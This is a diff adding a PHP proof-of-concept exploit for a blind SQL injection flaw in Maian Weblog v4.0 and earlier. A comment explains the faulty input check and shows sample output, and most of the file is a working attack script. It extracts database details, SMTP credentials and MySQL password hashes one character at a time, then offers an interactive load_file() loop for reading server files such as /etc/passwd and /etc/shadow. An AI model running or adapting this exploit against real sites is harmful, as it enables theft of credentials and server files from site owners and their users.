@@ -1,0 +1,301 @@
+<?php
+/*
+maian weblog <= v4.0 Remote Blind SQL Injection Exploit
+vendor: http://www.maianscriptworld.co.uk/
+Thanks to Johannes Dahse: http://bit.ly/dpQXMK
+
+Explanation:
+Lines 335 - 341 of the index.php we see this if statement that concerns
+our variable $b_post.
+
+   // Check month and year vars...
+   // If they don`t equal 0, are they numeric?..
+   if ($b_post==0 && !ctype_digit($b_post))
+   {
+     header("Location: index.php");
+     exit;
+   }
+
+This if statement is suppose to prevent the SQL Injection vulnerability.
+However the logic implimented is incorrect, as there will never be a situation
+where the $b_post variable that we control will ever be a 0 and a string value.
+
+So a simple fix to remediate this issue becomes clear, instead of an &&, the
+author was suppose to use an ||. o.O
+
+Further down in the index.php page on lines 348 - 361, we see the location of the
+actual vulnerable code.
+
+   $q_blog = mysql_query("SELECT * FROM ".$database['prefix']."blogs
+                          WHERE id = '$b_post'
+                          LIMIT 1
+                          ") or die(mysql_error());
+   $BLOG = mysql_fetch_object($q_blog);
+
+   // At this point, lets see if the last query fetched anything..
+   // If it didn`t, blog id is invalid. Might be someone bookmarked an old link..
+   // If no data, redirect to homepage..
+   if (mysql_num_rows($q_blog)==0)
+   {
+     header("Location: index.php");
+     exit;
+   }
+
+The page redirects after the query is executed. This way you probably won't spot the
+bug in your browser from a blackbox view :). No urldecode() so we can't bypass 
+magic_quotes_gpc and the admin credentials are not stored in the database. doh.
+
+Using < or > would make the PoC a little more efficient, but oh well :0)	 
+Assuming some stars are aligned, the PoC will make well over 11,000 requests...
+[mr_me@pluto maian_weblog]$ php PoC.php -t 192.168.56.101 -d /maian_weblog/ -p 127.0.0.1:8080
+
+-------------------------------------------------------
+maian weblog <= v4.0 Remote Blind SQL Injection Explo!t
+by mr_me - https://net-ninja.net/
+-------------------------------------------------------
+
+(+) Setting the proxy to 127.0.0.1:8080
+(+) Getting basic database information
+(+) Database version -> 5.1.41-3ubuntu12.9
+(+) Database name -> maian_weblog
+(+) Database user -> root@localhost
+(+) SMTP details found!
+(+) Getting SMTP host:user:pass -> localhost:maianmail:password
+(+) Access to MySQL database successful, dumping hash!
+(+) MySQL user:pass -> root:*EE4E2773D7530819563F0DC6FCE27446A51C9413
+(!) Access to load_file(), wanna play? (y/n): y
+
+(+) Please enter the file (q to quit): /etc/shadow
+(-) File doesn't exist/no access.
+(+) Please enter the file (q to quit): /etc/passwd
+(!) Dumping the /etc/passwd file, hold onto your knickers!
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:......
+*/
+
+print_r("
+-------------------------------------------------------
+maian weblog <= v4.0 Remote Blind SQL Injection Explo!t
+by mr_me - https://net-ninja.net/
+-------------------------------------------------------
+");
+
+if ($argc < 3) {
+print_r("
+-----------------------------------------------------------------------------
+Usage: php ".$argv[0]." -t <host:ip> -d <path> OPTIONS
+host:      target server (ip/hostname)
+path:      directory path to wordpress
+Options:
+ -p[ip:port]: specify a proxy
+Example:
+php ".$argv[0]." -t 192.168.1.5 -d /webapps/wp/ -p 127.0.0.1:8080
+php ".$argv[0]." -t 192.168.1.5 -d /webapps/wp/
+-----------------------------------------------------------------------------
+"); die; }
+
+error_reporting(7);
+ini_set("max_execution_time", 0);
+ini_set("default_socket_timeout", 5);
+
+$proxy_regex = "(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)";
+
+function setArgs($argv) {
+    $_ARG = array();
+    foreach ($argv as $arg) {
+        if (ereg("--([^=]+)=(.*)", $arg, $reg)) {
+            $_ARG[$reg[1]] = $reg[2];
+        } elseif(ereg("^-([a-zA-Z0-9])", $arg, $reg)) {
+            $_ARG[$reg[1]] = "true";
+        } else {
+            $_ARG["input"][] = $arg;
+        }
+    }
+    return $_ARG;
+}
+
+$myArgs = setArgs($argv);
+$host = $myArgs["input"]["1"];
+$path = $myArgs["input"]["2"];
+
+if (strpos($host, ":") == true){
+    $hostAndPort = explode(":",$myArgs["input"][1]);
+    $host = $hostAndPort[0];
+    $port = $hostAndPort[1];
+}else{
+    $port = 80;
+}
+
+if(isset($myArgs["p"])){
+    $proxyAndPort = explode(":",$myArgs["input"][3]);
+    $proxy = $proxyAndPort[0];
+    $pport = $proxyAndPort[1];
+    echo "\n(+) Setting the proxy to ".$proxy.":".$pport;
+}else{
+    echo "\n(-) Warning, a proxy was not set";
+}
+
+// rgods sendpacketii() function
+function sendpacket($packet)
+{
+    global $proxy, $host, $port, $pport, $html, $proxy_regex;
+    if (!isset($proxy)) {
+        $ock = fsockopen(gethostbyname($host),$port);
+        if (!$ock) {
+            echo "\n(-) No response from ".$host.":".$port; die;
+        }
+    }
+    else {
+        $c = preg_match($proxy_regex,$proxy);
+        if (!$c) {
+            echo "\n(-) Not a valid proxy..."; die;
+        }
+        $ock=fsockopen($proxy,$pport);
+        if (!$ock) {
+            echo "\n(-) No response from proxy..."; die;
+        }
+    }
+    fputs($ock,$packet);
+    if ($proxy == "") {
+        $html = "";
+        while (!feof($ock)) {
+            $html .= fgets($ock);
+        }
+    }
+    else {
+        $html = "";
+        while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a), $html))) {
+            $html .= fread($ock,1);
+        }
+    }
+    fclose($ock);
+    return $html;
+}
+
+function read() {
+    $fp1 = fopen("/dev/stdin", "r");
+    $input = fgets($fp1, 255);
+    fclose($fp1);
+    return $input;
+}
+
+if (!$myArgs["p"]) {$p = $path;} else {$p = "http://".$host.":".$port.$path;}
+
+function checksqli($sqli, $p){
+    $packet = "GET ".$p."index.php?cmd=blog&post=1".$sqli." HTTP/1.1\r\n";
+    $packet .= "Host: ".$host."\r\n";
+    $packet .= "Connection: Close\r\n\r\n";
+    $html = sendpacket($packet);
+    if (strlen($html) > 429) { return 1; } else{ return 0; }
+}
+
+function getbasicinfo($p){
+    echo "\n(+) Getting basic database information";
+    $basicinfo = array("version" => "@@version", "name" => "database()", "user" => "user()");
+    foreach($basicinfo as $key => $value){
+        echo "\n(+) Database ".$key." -> ";
+        $admin = ""; $j=1;
+        while (!strstr($admin,chr(0))){
+            for ($i=1; $i<=126; $i++){
+                $sqli="'+and+ascii(substring(".$value.",".$j.",1))='".$i;
+                $packet = "GET ".$p."index.php?cmd=blog&post=1".$sqli." HTTP/1.1\r\n";
+                $packet .= "Host: ".$host."\r\n";
+                $packet .= "Connection: Close\r\n\r\n";
+                $html = sendpacket($packet);
+                if (strlen($html) > 429){
+                    $admin.= chr($i);
+                    echo chr($i); break;
+                }
+                elseif($i === 126){
+                    $admin .= "\x00";
+                    break;
+                }
+            }
+        $j++;
+        }
+    }
+}
+
+function getlogindetails($p, $msg, $tsqli){
+    echo $msg;
+    $tempvar = ""; $j=1;
+    while (!strstr($tempvar,chr(0))){
+        for ($i=1; $i<=126; $i++){
+            if (!strpos($tsqli, "load_file") == true){
+                $sqli = $tsqli."+limit+0,1),".$j.",1))='".$i;
+            }
+            else
+            {
+                $sqli = $tsqli."),".$j.",1))='".$i;
+            }
+            $packet = "GET ".$p."index.php?cmd=blog&post=1".$sqli." HTTP/1.1\r\n";
+            $packet .= "Host: ".$host."\r\n";
+            $packet .= "Connection: Close\r\n\r\n";
+            $html = sendpacket($packet);
+            if (strlen($html) > 429){
+                echo chr($i); break;
+            }
+            elseif($i === 126){
+                $tempvar .= "\x00";
+                break;
+            }
+        }
+    $j++;
+    }
+
+}
+
+function strhex($string)
+{
+    $hex = "";
+    for ($i=0; $i < strlen($string); $i++){
+        $hex .= dechex(ord($string[$i]));
+    }
+    return $hex;
+}
+
+getbasicinfo($p);
+$smtpsqli = "'+and+substring((sEleCt+smtp+from+mw_settings+limit+0,1),1,1)='1";
+if (checksqli($smtpsqli, $p)){
+    echo "\n(+) SMTP details found!";
+    $msg = "\n(+) Getting SMTP host:user:pass -> ";
+    $sqli = "'+and+ascii(substring((sElEcT+cOncAt(";
+    $sqli .= "smtp_host,0x3a,smtp_user,0x3a,smtp_pass)+";
+    $sqli .= "from+mw_settings";
+    getlogindetails($p, $msg, $sqli);
+}
+
+$mysqlsqli = "'+and+(select+1+from+mysql.user+limit+0,1)='1";
+if (checksqli($mysqlsqli, $p)){
+    echo "\n(+) Access to MySQL database successful, dumping hash!";
+    $msg = "\n(+) MySQL user:pass -> ";
+    $sqli = "'+and+ascii(substring((sElEcT+cOncAt(";
+    $sqli .= "user,0x3a,password)+from+mysql.user+";
+    getlogindetails($p, $msg, $sqli);
+    $loadsqli = "'+and+!isnull(loAd_fIle(0x2F6574632F706173737764))--+";
+    if (checksqli($loadsqli, $p)){
+        echo "\n(!) Access to load_file(), wanna play? (y/n): ";
+        $resp = trim(read());
+        if(strcmp($resp,"y") === 0){
+            $loadfile = "";
+            while (strcmp($loadfile, "q") != 0){
+                echo "\n(+) Please enter the file (q to quit): ";
+                $loadfile = trim(read());
+                if (strcmp($loadfile, "q") === 0) { break; }
+                $loadsqli = "'+and+!isnull(loAd_fIle(0x".strhex($loadfile)."))--+";
+                if(checksqli($loadsqli, $p)){
+                    $sqli = "'+and+ascii(substring(load_file(0x".strhex($loadfile);
+                    $msg = "(!) Dumping the ".$loadfile." file, hold onto your knickers!\n";
+                    getlogindetails($p, $msg, $sqli);
+                }
+                else{
+                    echo "(-) File doesn't exist/no access.";
+                }
+            }
+        }
+        else{
+            echo "(-) Ok Exiting..\n"; die;
+        }
+    }
+}
+?>
